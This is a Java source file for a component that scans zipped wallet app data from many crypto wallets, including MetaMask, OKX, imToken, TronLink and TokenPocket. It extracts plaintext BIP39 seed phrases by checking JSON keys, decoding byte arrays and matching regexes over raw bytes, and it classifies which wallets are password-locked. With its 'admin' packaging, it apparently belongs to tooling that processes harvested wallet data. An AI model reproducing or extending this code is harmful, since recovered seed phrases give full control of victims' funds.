package com.admin.parse;

import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.util.Collection;
import java.util.List;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Component;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.admin.util.Bip39Util;

import lombok.RequiredArgsConstructor;

/**
 * 对齐 Python wallet_status._scan_plaintext_mnemonic / _phrase_from_json_obj。
 */
@Component
@RequiredArgsConstructor
public class WalletInspect {

    private static final Pattern MNEMONIC_BYTES = Pattern.compile(
            "\\b([a-z]{3,8}(?:\\s+[a-z]{3,8}){11,23})\\b");

    private final Bip39Util bip39Util;

    /**
     * 对齐 Python inspect_wallet_zip 里 unlockable=True：自动扫不会出明文助记词，
     * 不必再整包扫 json/mmkv。
     */
    public boolean skipPlaintextScan(String wkey, List<String> names, Path archive) {
        if (names == null || names.isEmpty() || StringUtils.isBlank(wkey)) {
            return false;
        }
        switch (wkey) {
            case "onekey":
            case "digitalshield":
                return anyBaseName(names, "onekeyv5", "digitalshieldv5");
            case "okx":
                return anyMember(names, "documents/wallet", "/wallet") || anyMember(names, "wallet");
            case "metamask":
                return anyMember(names, "persist-keyringcontroller") || anyMember(names, "keyringcontroller");
            case "imtoken":
                return walletsV2Json(names);
            case "tronlink":
                return anyMember(names, "keystore");
            case "tonhub":
                return anyMember(names, "mmkv.default");
            case "bitkeep":
                return anyMember(names, "bitkeep.db");
            case "coin98":
                return anyMember(names, "mmkv.default.enc");
            case "globalwallet":
            case "tokenpocket":
                return encryptedSqlite(archive, names);
            default:
                return false;
        }
    }

    public static boolean maybePasswordLocked(String wkey) {
        if (wkey == null) {
            return false;
        }
        switch (wkey) {
            case "onekey":
            case "digitalshield":
            case "okx":
            case "metamask":
            case "imtoken":
            case "tronlink":
            case "tonhub":
            case "bitkeep":
            case "coin98":
            case "globalwallet":
            case "tokenpocket":
                return true;
            default:
                return false;
        }
    }

    public String scanPlaintextMnemonic(Path archive, Collection<String> prefixes) {
        if (archive == null) {
            return null;
        }
        String[] found = new String[1];
        ArchiveIO.walk(archive, prefixes, (name, in, size) -> {
            if (found[0] != null || !interesting(name)) {
                ArchiveIO.skipFully(in, size);
                return;
            }
            byte[] raw = ArchiveIO.readLimited(in, 500_000);
            if (raw == null || raw.length == 0) {
                return;
            }
            String phrase = phraseFromRaw(raw);
            if (phrase != null) {
                found[0] = phrase;
            }
        }, 500_000);
        return found[0];
    }

    public String phraseFromRaw(byte[] raw) {
        if (raw == null || raw.length == 0) {
            return null;
        }
        try {
            String text = new String(raw, StandardCharsets.UTF_8);
            Object obj = JSON.parse(text);
            String phrase = phraseFromJson(obj);
            if (phrase != null) {
                return phrase;
            }
        } catch (Exception ignored) {
        }
        String ascii = new String(raw, StandardCharsets.ISO_8859_1).toLowerCase(Locale.ROOT);
        Matcher m = MNEMONIC_BYTES.matcher(ascii);
        while (m.find()) {
            String text = m.group(1).replaceAll("\\s+", " ").trim().toLowerCase(Locale.ROOT);
            if (bip39Util.validateMnemonic(text)) {
                return text;
            }
        }
        return null;
    }

    public String phraseFromJson(Object obj) {
        if (obj instanceof JSONObject) {
            JSONObject jo = (JSONObject) obj;
            for (String k : new String[] {"mnemonic", "seedPhrase", "seed_phrase", "phrase"}) {
                Object v = jo.get(k);
                String p = asMnemonic(v);
                if (p != null) {
                    return p;
                }
            }
            for (String k : jo.keySet()) {
                String p = phraseFromJson(jo.get(k));
                if (p != null) {
                    return p;
                }
            }
        } else if (obj instanceof JSONArray) {
            JSONArray arr = (JSONArray) obj;
            for (int i = 0; i < arr.size(); i++) {
                String p = phraseFromJson(arr.get(i));
                if (p != null) {
                    return p;
                }
            }
        }
        return null;
    }

    private String asMnemonic(Object v) {
        if (v instanceof String) {
            String s = ((String) v).trim().replaceAll("\\s+", " ").toLowerCase(Locale.ROOT);
            return bip39Util.validateMnemonic(s) ? s : null;
        }
        if (v instanceof JSONArray) {
            JSONArray arr = (JSONArray) v;
            if (!arr.isEmpty() && arr.get(0) instanceof Number) {
                try {
                    byte[] bytes = new byte[arr.size()];
                    for (int i = 0; i < arr.size(); i++) {
                        bytes[i] = (byte) (arr.getIntValue(i) & 0xff);
                    }
                    String text = new String(bytes, StandardCharsets.UTF_8).trim();
                    String s = text.replaceAll("\\s+", " ").toLowerCase(Locale.ROOT);
                    return bip39Util.validateMnemonic(s) ? s : null;
                } catch (Exception ignored) {
                    return null;
                }
            }
        }
        return null;
    }

    private static boolean interesting(String member) {
        String nl = ArchiveIO.normalize(member).toLowerCase(Locale.ROOT);
        if (nl.endsWith("/")) {
            return false;
        }
        return nl.endsWith(".json")
                || nl.contains("mmkv")
                || nl.contains("keystore")
                || nl.contains("persist")
                || nl.contains("plaintext")
                || nl.contains("unused");
    }

    public static boolean anyMember(Collection<String> names, String... needles) {
        if (names == null) {
            return false;
        }
        for (String n : names) {
            String nl = StringUtils.defaultString(n).toLowerCase(Locale.ROOT);
            for (String needle : needles) {
                if (nl.contains(needle.toLowerCase(Locale.ROOT))) {
                    return true;
                }
            }
        }
        return false;
    }

    private static boolean anyBaseName(Collection<String> names, String... bases) {
        if (names == null) {
            return false;
        }
        for (String n : names) {
            String base = ArchiveIO.baseName(n).toLowerCase(Locale.ROOT);
            for (String want : bases) {
                if (base.equals(want)) {
                    return true;
                }
            }
        }
        return false;
    }

    private static boolean walletsV2Json(Collection<String> names) {
        if (names == null) {
            return false;
        }
        for (String n : names) {
            String nl = ArchiveIO.normalize(n).toLowerCase(Locale.ROOT);
            if (nl.contains("walletsv2") && nl.endsWith(".json")) {
                return true;
            }
        }
        return false;
    }

    private boolean encryptedSqlite(Path archive, List<String> names) {
        if (!anyMember(names, "main.sqlite3") && !anyMember(names, "label.sqlite3")) {
            return false;
        }
        String member = null;
        for (String n : names) {
            String base = ArchiveIO.baseName(n).toLowerCase(Locale.ROOT);
            if ("main.sqlite3".equals(base) || "label.sqlite3".equals(base)) {
                member = n;
                break;
            }
        }
        if (member == null || archive == null) {
            return true;
        }
        byte[] head = ArchiveIO.readMember(archive, member, 32);
        if (head == null || head.length < 16) {
            return true;
        }
        String magic = new String(head, 0, Math.min(head.length, 16), StandardCharsets.ISO_8859_1);
        return !magic.startsWith("SQLite format 3");
    }
}
